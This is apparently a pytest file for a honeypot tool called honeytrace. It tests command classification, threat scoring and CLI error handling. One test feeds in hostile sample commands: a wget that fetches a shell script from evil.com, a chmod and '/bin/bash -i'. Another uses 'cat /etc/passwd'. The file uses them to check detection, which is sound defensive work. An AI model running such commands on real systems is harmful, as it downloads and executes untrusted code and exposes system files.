"""Smoke tests for HONEYTRACE."""
import json

import pytest

from honeytrace import TOOL_NAME, TOOL_VERSION
from honeytrace.cli import main as cli_main
from honeytrace.core import (
    classify_command,
    simulate_session,
    parse_events,
    analyze_events,
    SessionReport,
    SERVICE_PROFILES,
)


def test_version():
    assert TOOL_VERSION
    assert TOOL_NAME == "honeytrace"


def test_classify_command_recon():
    result = classify_command("whoami")
    assert result["tactic"] == "discovery"
    assert result["severity"] > 0


def test_classify_command_unknown():
    result = classify_command("echo hello")
    assert result["tactic"] == "uncategorized"


def test_simulate_session_returns_report():
    report = simulate_session("ssh", ["whoami", "uname -a"])
    assert isinstance(report, SessionReport)
    assert report.service == "ssh"
    assert report.command_count == 2
    assert report.threat_score >= 0
    assert report.verdict in ("benign", "low", "medium", "high", "critical")


def test_simulate_session_scores_high_for_dangerous_commands():
    cmds = ["wget http://evil.com/shell.sh", "chmod +x shell.sh", "/bin/bash -i"]
    report = simulate_session("ssh", cmds)
    # Reverse-shell + malware-download commands should produce a critical verdict
    assert report.verdict in ("high", "critical")
    assert report.threat_score >= 40


def test_service_profiles_present():
    for name in ("ssh", "rdp", "smb", "http"):
        assert name in SERVICE_PROFILES
        svc = SERVICE_PROFILES[name]
        assert svc.banner
        assert svc.port > 0


def test_parse_and_analyze_events():
    lines = [
        json.dumps({"ts": "2026-06-08T12:00:00+00:00", "src_ip": "1.2.3.4",
                    "service": "ssh", "session_id": "abc123",
                    "kind": "command", "data": "cat /etc/passwd"}),
        json.dumps({"ts": "2026-06-08T12:00:01+00:00", "src_ip": "1.2.3.4",
                    "service": "ssh", "session_id": "abc123",
                    "kind": "auth", "data": "login attempt"}),
    ]
    events = parse_events(lines)
    assert len(events) == 2
    # command event should be auto-classified
    cmd_ev = events[0]
    assert cmd_ev.tactic == "credential-access"

    reports = analyze_events(events)
    assert len(reports) == 1
    assert reports[0].src_ip == "1.2.3.4"
    assert reports[0].command_count == 1


def test_cli_importable():
    from honeytrace.cli import main
    assert callable(main)


# ---------------------------------------------------------------------------
# Hardening: input validation and edge-case tests
# ---------------------------------------------------------------------------


def test_simulate_unknown_service_raises():
    """simulate_session raises ValueError for unknown service names."""
    with pytest.raises(ValueError, match="unknown service"):
        simulate_session("telnet", [])


def test_simulate_accept_after_zero_raises():
    """accept_after=0 is nonsensical; expect a clear ValueError."""
    with pytest.raises(ValueError, match="accept_after must be"):
        simulate_session("ssh", [], accept_after=0)


def test_simulate_accept_after_non_integer_raises():
    """A non-numeric accept_after should raise ValueError, not TypeError."""
    with pytest.raises(ValueError, match="accept_after must be an integer"):
        simulate_session("ssh", [], accept_after="bad")


def test_parse_events_severity_non_numeric_raises():
    """A severity field that can't be cast to int must raise ValueError
    with the offending line number — not a bare int() traceback."""
    bad_line = json.dumps({
        "ts": "2026-01-01T00:00:00+00:00",
        "src_ip": "1.2.3.4",
        "service": "ssh",
        "session_id": "s1",
        "kind": "auth",
        "data": "login",
        "severity": "high",  # should be an integer
    })
    with pytest.raises(ValueError, match=r"line 1.*severity"):
        parse_events([bad_line])


def test_parse_events_empty_input_returns_empty_list():
    """An empty input (or all-blank lines) must not raise."""
    assert parse_events([]) == []
    assert parse_events(["", "  ", "\t"]) == []


def test_analyze_events_empty_input_returns_empty_list():
    """analyze_events on an empty list must return an empty list."""
    assert analyze_events([]) == []


def test_cli_simulate_missing_script_exits_1(capsys):
    """--script pointing to a nonexistent file should exit 1 with a
    clear message on stderr, never a raw traceback."""
    rc = cli_main(["simulate", "ssh", "--script", "/nonexistent/path/cmds.txt"])
    err = capsys.readouterr().err
    assert rc == 1
    assert "error" in err.lower()
    assert "script" in err.lower()


def test_cli_simulate_accept_after_zero_exits_1(capsys):
    """--accept-after 0 must produce exit 1 with a clear error message."""
    rc = cli_main(["simulate", "ssh", "--accept-after", "0"])
    err = capsys.readouterr().err
    assert rc == 1
    assert "error" in err.lower()


def test_cli_analyze_malformed_jsonl_exits_1(tmp_path, capsys):
    """A JSONL file containing bad JSON must exit 1 with an error on stderr."""
    bad_file = tmp_path / "bad.jsonl"
    bad_file.write_text('{"ok": true}\nnot valid json\n', encoding="utf-8")
    rc = cli_main(["analyze", str(bad_file)])
    err = capsys.readouterr().err
    assert rc == 1
    assert "error" in err.lower()
